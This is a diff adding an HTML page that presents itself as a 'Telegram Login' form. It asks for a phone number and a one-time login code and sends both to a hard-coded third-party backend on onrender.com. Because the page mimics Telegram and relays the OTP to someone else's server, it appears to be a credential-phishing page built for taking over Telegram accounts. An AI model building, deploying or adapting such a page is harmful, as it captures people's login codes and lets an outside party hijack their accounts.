@@ -1,0 +1,65 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Login</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
+    input, button { width: 100%; padding: 0.5rem; margin: 0.5rem 0; }
+    button { background: #0088cc; color: white; border: none; cursor: pointer; }
+    button:hover { background: #0077b3; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h3>Telegram Login</h3>
+    <input type="text" id="phone" placeholder="Enter phone number" />
+    <button onclick="sendCode()">Send Code</button>
+    <input type="text" id="code" placeholder="Enter OTP" style="display:none;" />
+    <button onclick="verifyCode()" style="display:none;">Verify</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const backendURL = "https://telegram-backend-o5bg.onrender.com"; // change if needed
+
+    async function sendCode() {
+      const phone = document.getElementById('phone').value;
+      const res = await fetch(backendURL + "/send-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone })
+      });
+
+      if (res.ok) {
+        document.getElementById("status").innerText = "Code sent!";
+        document.getElementById("code").style.display = "block";
+        document.querySelectorAll("button")[1].style.display = "block";
+      } else {
+        const err = await res.json();
+        document.getElementById("status").innerText = "Error: " + err.error;
+      }
+    }
+
+    async function verifyCode() {
+      const phone = document.getElementById('phone').value;
+      const code = document.getElementById('code').value;
+      const res = await fetch(backendURL + "/verify-code", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone, code })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById("status").innerText = "Login successful!";
+      } else {
+        document.getElementById("status").innerText = "Error: " + data.error;
+      }
+    }
+  </script>
+</body>
+</html>
